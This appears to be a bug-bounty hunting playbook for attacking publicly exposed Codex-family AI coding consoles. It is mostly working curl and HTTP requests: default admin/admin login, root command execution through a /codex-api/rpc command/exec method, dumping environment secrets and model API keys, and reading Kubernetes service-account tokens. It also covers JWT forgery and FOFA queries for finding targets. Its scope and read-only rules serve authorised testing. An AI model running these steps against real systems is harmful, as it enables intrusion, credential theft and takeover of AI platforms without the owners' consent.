# Cloud IDE / Codex-family AI coding platforms: weak password → Root RCE → credential chain

> Type: authentication flaw + dangerous RPC + container/cluster credential chain
> Write-up or not is decided only by `vuln-report-format.md`. Find the short-table pointer by searching the title.

---

## Codex-family coding-console RPC (pointer in the short table)

Identify: a public coding console with `/tenant-api/login` + `/codex-api/rpc` (or similar tenant login + Codex RPC). It is NOT the chat-interface bash tool (that shot is in `agent-tool-exec-test.md`), nor VS Code reading environ without a login wall (that shot is in `path-traversal-lfi-test.md`).

Attack: the current site only. Get a session from bare defaults, then `command/exec` / `fs/*` / `env`. Also try `meta/methods` without a cookie. Once identified, attack only the current site; opening new FOFA seeds is forbidden.

Counts as: root, and hostname looks like a persistent compute-plane Pod, and you can read the cluster SA or model Key.

False positives: wildcard-cert temporary instances destroyed at any moment; login only with no RPC; model merely claims in words that it executed. A half chain (login only) → keep digging for RPC, do not put it in the short table as a confirmed kill.

---

## 1. Pattern profile (test when you see this)

| Trait | Example |
|---|---|
| Domain/product | AI coding assistant, playbook, Codex-family console (not pinned to any one vendor) |
| Paths | `/tenant-api/login`, `/codex-api/rpc`, `/tenant-api/*` |
| Framework traces | OpenAI Codex, `@openai/codex`, thread/model RPC |
| Environment | dev / pre / fat / gray / sandbox (**publicly exposed DEV gets scanned first**, then look for a production counterpart) |
| Default credentials | the bare default login of this console form (of the `admin/admin` kind), **not** a wordlist against every site's login box |

**One-line chain:**

```
weak password / unauthenticated login → tenant session (JWT/Cookie)
  → POST /codex-api/rpc method=command/exec (root)
  → env / fs read cluster SA + model API Key + invite code
  → quota consumption / potential lateral movement / persistence
```

---

## 2. Minimal probe matrix (per candidate Host)

### 2.1 Fingerprint

```bash
# Login surface
curl -sk -o /dev/null -w "%{http_code}" -X POST "https://HOST/tenant-api/login" \
  -H "Content-Type: application/json" -d '{"username":"x","password":"y"}'

# RPC surface (even without a cookie, look at the error shape: 401 vs method not found vs passthrough)
curl -sk -X POST "https://HOST/codex-api/rpc" \
  -H "Content-Type: application/json" \
  -d '{"method":"meta/methods","params":{}}'
```

Liveness signals:
- Login returns JSON (userId / session / password error) rather than a whole-site 405 HTML page
- RPC returns JSON-RPC shape / methods list / explicit error when not logged in
- Frontend title contains codex / playbook / coding console

### 2.2 Weak password (login)

Only hit the bare default login of this console form on the **current site** (`dig-scope` §4.1.1: login-form wordlists are not mandatory). One look:

```bash
curl -sk -X POST "https://HOST/tenant-api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' -D -
```

Common: `admin/admin`, `admin/123456`; if there is `TENANT_ADMIN_USERNAMES` / an invite code, use it as a key. If there is no entry point or it is disproven, stop; don't grind the CAPTCHA.

Success: `Set-Cookie: tenant_session=...` or body contains `userId` + identity admin.

### 2.3 RCE / file / meta methods (after login)

```bash
# Method enumeration
curl -sk -X POST "https://HOST/codex-api/rpc" \
  -H "Content-Type: application/json" \
  -b "tenant_session=SESSION" \
  -d '{"method":"meta/methods","params":{}}'

# Command execution (minimal proof: id / whoami / hostname)
curl -sk -X POST "https://HOST/codex-api/rpc" \
  -H "Content-Type: application/json" \
  -b "tenant_session=SESSION" \
  -d '{"method":"command/exec","params":{"command":["id"]}}'

# Directory / read file
-d '{"method":"fs/readDirectory","params":{"path":"/"}}'
-d '{"method":"fs/readFile","params":{"path":"/etc/os-release"}}'

# Environment variables (secrets)
-d '{"method":"command/exec","params":{"command":["env"]}}'

# Cluster SA (if the container is inside a cluster)
-d '{"method":"command/exec","params":{"command":["cat","/var/run/secrets/kubernetes.io/serviceaccount/token"]}}'
```

**Dangerous method list (a hit means high value):**

| method | Meaning |
|--------|------|
| `command/exec` | Arbitrary command |
| `fs/readFile` / `fs/writeFile` / `fs/remove` / `fs/readDirectory` | File system |
| `meta/methods` | Capability-surface enumeration |
| `thread/start` / `model/list` | AI sessions and models (consumes Key) |
| git-related RPC | Repository read/write |

---

## 3. How to write hard impact proof (SRC)

Preferred evidence order:

1. **Root RCE**: `id` → `uid=0(root)` (minimal, reproducible)
2. **Environment and persistent service**: hostname looks like a compute-plane Pod name ≠ random temporary-sandbox wording
3. **Secrets**: model `*_API_KEY` (middle segment may be masked in the report)
4. **Cluster**: `KUBERNETES_SERVICE_HOST` + SA token readable
5. **Invite code / admin usernames**: can register a persistent account
6. **RPC surface breadth**: 80+ methods, just capture a segment of the dangerous list

**Write the boundaries clearly:**
- Publicly unauthenticated / weak password only
- Root or not, inside a cluster or not
- Whether the Key can be used for external model quota consumption
- DEV vs production: if it's only DEV, state the environment in the body; if you can find a **prod counterpart**, hitting both is more solid

**False positives, nailed down once more:** wildcard-cert temporary instances destroyed at any moment → not a confirmed kill. Persistent compute plane + credential chain is what earns further write-up. A half chain (login with no RCE) → keep digging, don't enter the table as a confirmed kill.

---

## 4. How to find assets

**Attack the current site only.** Once you identify `/tenant-api/login`, `/codex-api/rpc`, run §2 on this host; opening new seeds or FOFA-wide same-skin scans upon identification is forbidden (hunt-iter opening; `dig-scope` one-seed closure). Good root domains only get fed back in; finish the remaining live surface of the current seed before searching.

The queries below are **only** for paging through this seed's results when the current task/seed is already on the Codex / coding-console trail — not for opening a new factory just because you spotted the same framework:

```
body="/codex-api/rpc" || body="/tenant-api/login"
body="codex-api" && body="tenant"
body="@openai/codex" || body="command/exec"
```

`tenant-api`, `codex-api`, RPC methods, invite codes in the current site's JS belong to this site's list; don't use them to open new seeds.

---

## 5. Isomorphic variants (don't only know admin/admin)

1. **Zero-auth RPC**: `command/exec` / `meta/methods` directly with no Cookie
2. **Registration endpoint + fixed invite code**: env or frontend hardcodes `TENANT_INVITE_CODE`
3. **Weak JWT key / alg none**: forge `tenant_session` as admin
4. **WebSocket / another gateway**: same-origin Codex pushes commands over WS
5. **Sibling in the same seed**: go to the `-dev` / production host for a one-look differential only (escalate only if new paths / changed responses). Opening a new FOFA seed for this is forbidden
6. **Multi-tenant isolation**: can a normal user session also `command/exec` (vertical privilege-escalation RCE)

---

## 6. Operational discipline

- Command execution only does **id / hostname / read-only cat of specified paths**; destructive writes, mining, and internal-network scan/brute-force are forbidden
- When writing secrets into the report, follow the masking policy (if the platform requires full, paste full; otherwise mask the middle + state the length)
- Don't stop at "can upload and can download"; this chain's value is **RCE + secrets + cluster**
- A half chain (login with no RCE) → keep digging for RPC

---

## 7. Reference skeleton (no live site)

| Item | Value |
|----|-----|
| Login | `POST /tenant-api/login` bare default → `tenant_session` |
| RCE | `POST /codex-api/rpc` `command/exec` → root |
| Environment | compute-plane Pod; cluster API on internal network |
| Chain assets | model Key, SA token, invite code, broad RPC |
| Write-up or not | only per `vuln-report-format.md`. Whether DEV counts depends on the SRC's standard; a prod counterpart is more solid |

Reproduction skeleton (replace HOST / SESSION with real values from the current site):

```http
POST /tenant-api/login HTTP/1.1
Host: HOST
Content-Type: application/json

{"username":"admin","password":"admin"}
```

```http
POST /codex-api/rpc HTTP/1.1
Host: HOST
Content-Type: application/json
Cookie: tenant_session=SESSION

{"method":"command/exec","params":{"command":["id"]}}
```

---

## 8. One-liner

**Public Codex-family coding consoles: hit the current site's `/tenant-api/login` bare default and registration code first, then hit `/codex-api/rpc`'s `command/exec` + `fs/*` + `env`, closing the loop with root + cluster + API Key. Once identified, attack only the current site, preferring the persistent production surface.**
